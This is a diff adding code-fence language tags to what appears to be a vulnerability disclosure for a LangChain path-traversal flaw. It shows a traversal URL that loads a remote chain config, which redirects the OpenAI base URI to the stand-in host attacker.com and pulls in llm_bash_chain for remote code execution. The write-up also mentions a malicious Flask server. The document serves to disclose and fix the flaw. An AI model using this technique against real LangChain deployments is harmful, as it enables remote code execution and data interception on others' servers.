@@ -10,7 +10,7 @@ In essence, the vulnerability looks as follows. An attacker is just required to 
 
 The `malicious_path` parameter we see here needs to fit [a specific regex](https://github.com/langchain-ai/langchain/blob/v0.1.9/libs/core/langchain_core/utils/loading.py#L17) set by the framework. It also needs to have the `remote_path` path starting with [a specific prefix](https://github.com/langchain-ai/langchain/blob/v0.1.9/libs/core/langchain_core/utils/loading.py#L35). This prefix is `chains` when loading a chain. After we've accounted for these properties, we use ../ to traverse back to the root of GitHub. The final URL looks like `https://raw.githubusercontent.com/hwchase17/langchain-hub/ANYTHING/chains/../../../../../../../../../PinkDraconian/PoC/main/poc_rce.json`. If we resolve these `../` parameters, we get `https://raw.githubusercontent.com/PinkDraconian/PoC/main/poc_rce.json`. This thus loads a `json` file from my personal GitHub.
 
-```
+```python
 from langchain_core.prompts import load_prompt
 from langchain.chains import load_chain
 
@@ -23,7 +23,7 @@ print(chain.invoke("ANYTHING"))
 
 We can prove impact by hosting a malicious poc file on our GitHub. In this case we hosted the following file. The JSON file overwrites the OpenAI base URI and forces the server to make requests to `attacker.com`. It also uses the experimental `llm_bash_chain` to later achieve RCE. NOTE: I am aware that this feature is experimental, however do note that in my poc it is not imported anywhere. By fetching this configuration, the experimental module is loaded automatically, without the original developer wanting it.
 
-```
+```json
 {
     "memory": null,
     "verbose": false,
@@ -47,7 +47,7 @@ We can prove impact by hosting a malicious poc file on our GitHub. In this case 
 
 We now just need to host a malicious server at `attacker.com`. I hosted the following:
 
-```
+```python
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
